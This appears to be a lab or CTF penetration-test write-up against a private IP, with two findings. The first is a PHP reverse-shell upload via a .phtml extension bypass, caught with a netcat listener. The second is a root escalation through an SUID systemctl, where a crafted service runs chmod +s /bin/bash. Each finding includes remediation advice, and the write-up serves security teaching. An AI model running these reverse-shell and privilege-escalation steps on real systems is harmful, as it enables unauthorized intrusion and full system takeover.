# Vulnerability Assessment: Remote Code Execution via Unrestricted File Upload

- Vulnerability Tittle : Unrestricted File Upload

- OWASP Top 10 Risk : A04:2021 - Insecure Design

- CWE ID : CWE-434 Unrestricted Upload of File with Dangerous Type

- CVSS : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H – 9.8

- Severity : High/Critical

- Target URL : http://10.48.186.114:3333/internal/ & http://10.48.186.114:3333/internal/uploads

### Description

The web application features a file upload mechanism at the `/internal/` directory that is vulnerable to Arbitrary File Upload. Although the system attempts to restrict file uploads by implementing an extension blacklist (blocking standard `.php` files), this filter is poorly configured.
An attacker can easily bypass this restriction by using alternative PHP extensions, such as `.phtml`. Because the underlying Apache web server is configured to execute `.phtml` files as PHP scripts, uploading a malicious reverse shell script allows the attacker to achieve Remote Code Execution (RCE) and gain unauthorized initial access to the underlying operating system.

### Attack Configuration

- Directory Fuzzing : Use tools like GoBuster / DirBuster / FFUF to URL Target: `http://10.48.186.114:3333`

- Reverse Shell : Download php-reverse-shell payload, [here](https://github.com/pentestmonkey/php-reverse-shell).

- The exploitation process is carried out using the Bypassing File Extension Filtering technique. We use Burp Suite to intercept upload requests, then change the file extension from `.php` to `.phtml` to trick the server's blacklist filter.

- Attack Type : Sniper (targeting the `.php` parameter)
 
- Payload Type : Simple List Custom, [here payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md).

- Before executing the attack, the connection parameters within the PHP reverse shell script must be customized:
  - Open the script using a text editor (e.g., nano or mousepad)
    
  - Locate the configuration section and update the local IP ($ip) and listening port ($port) variables to establish a            connection back to the attacker's machine.
 
  - ```php
    $ip = '10.xx.xx.xx'; // Attacker's VPN IP
    $port = 1234;       // Attacker's Netcat Listening Port
    ```

- Once the payload is successfully uploaded, the attacker must trigger the execution by making an HTTP GET request to the       uploaded file's directory. Navigate to the following URL to invoke the shell:
  http://<TARGET_IP>/internal/uploads/php-reverse-shell.phtml

Concurrently, a Netcat listener must be active on the attacker's machine (nc -lvnp <PORT>) to capture the incoming connection, granting initial access as the www-data user.

### Exploitation Evidence (Proof Of Concept)

After triggering the uploaded `.phtml` payload via the browser, the Netcat listener successfully intercepted the incoming connection from the target server. This confirms a successful Remote Code Execution (RCE), granting initial low-privilege access as the `www-data` user. 

To verify the active session and current working directory, standard system enumeration commands (`whoami`, `id`, `hostname`, and `pwd`) were executed.

<img width="1017" height="198" alt="Pasted image 20260523001417" src="https://github.com/user-attachments/assets/1863a67c-f562-456c-870b-4f7fb4d5eb65" />

### Remediation & Mitigation

To mitigate the Unrestricted File Upload vulnerability and prevent Remote Code Execution (RCE), the following security controls must be implemented:

 - Implement Whitelist-Based Extension Filtering: Replace the weak extension blacklist with a strict whitelist. Only permit safe,              explicitly defined file types (e.g., `.jpg`, `.jpeg`, `.png`) and reject all other extensions by default.

 - File Content Validation (MIME-Type & Magic Numbers): Do not rely solely on the file extension. Validate the actual file content using       Magic Numbers (File Signatures) and MIME-type checks to ensure the file matches its declared extension.

 - Disable Script Execution in Upload Directories: Configure the Apache web server (via `.htaccess` or main configuration files) to            explicitly disable script execution (PHP handler) within the `/internal/uploads/` directory.

# Vulnerability Assessment : Privilege Escalation via SUID Binary

Vulnerability Tittle : Privilege Escalation via Misconfigured SUID Binary (`systemctl`)

OWASP Top 10 Risk : A04:2021 - Insecure Design

CWE ID : CWE-269: Improper Privilege Management

CVSS : CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H – 8.8

Severity : High

Target : `/bin/systemctl`

### Description

During the post-exploitation enumeration phase, a local privilege escalation vulnerability was discovered due to a security misconfiguration in the Linux file system permissions. The `systemctl` binary was found to have the SUID (Set Owner User ID) bit enabled, allowing it to execute with the privileges of the file owner (which is `root`).

Under standard security practices, administrative tools like `systemctl` should never have the SUID bit set. An attacker with low-privilege access (such as `www-data`) can abuse this misconfiguration by creating a custom malicious systemd service file. When this service is enabled and started via the SUID-enabled `systemctl`, it executes commands with root privileges, leading to a complete system compromise.

### Attack Configuration

- Local SUID Binary Enumeration :

  After gaining initial access as the `www-data` user, a local enumeration command was executed to   identify misconfigured     binaries with the SUID bit set:

  ```bash
  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
  ```

- Crafting the Malicious Systemd Service

  To abuse systemctl, a custom environmental variable and a malicious systemd service  configuration were defined. The          payload  was configured to execute a command that copies the root shell (/bin/dash or a reverse shell) or changes             permissions, granting elevated access 

  This is where gtfobins becomes our helper.
  The exploit structure utilized is from [here.](https://gtfobins.org/gtfobins/systemctl/)

  *i will aslo show mine :*

  ```bash
  echo '[Service]
  Type=oneshot
  ExecStart=chmod +s /bin/bash
  [Install]
  WantedBy=multi-user.target' > /tmp/ddok.service
  ```

 *you can change "ddok" to anything, this is just an example.*

- Linking the Custom Service to Systemd

  Since the custom service file was created within the temporary directory (`/tmp`), the `systemd` manager is initially         unaware of its existence. To resolve this, the SUID-enabled `systemctl` binary was used with the `link` command. This         action creates a symbolic link (symlink) from `/tmp/root.service` into the official systemd configuration directory,          register-ing it as a valid system service.

  ```bash
  systemctl link /tmp/ddok.service
  ```

- Triggering the Privilege Escalation

  Using the SUID-enabled systemctl, the newly created malicious service was enabled and linked to execute with root             privileges
    
  ```bash
  systemctl enable --now /tmp/ddok.service
  ```

Once executed, the service forces the system to assign the SUID bit to `/bin/bash`, allowing the attacker to spawn a root shell by executing `/bin/bash -p`

### Exploitation Evidence (Proof Of Concept)

To verify that full administrative control had been achieved, standard identity check commands (`whoami` and `id`) were run, confirming a successful transition from `www-data` to `root`.

<img width="791" height="217" alt="Pasted image 20260523001612" src="https://github.com/user-attachments/assets/5221920c-5c12-4730-a367-cb25d9a95314" />

### Remediation & Mitigation

- Remove Unnecessary SUID Bits: Conduct a strict audit of the filesystem and remove the SUID permission from administrative binaries that     do not require it for standard user execution.

Thank you!
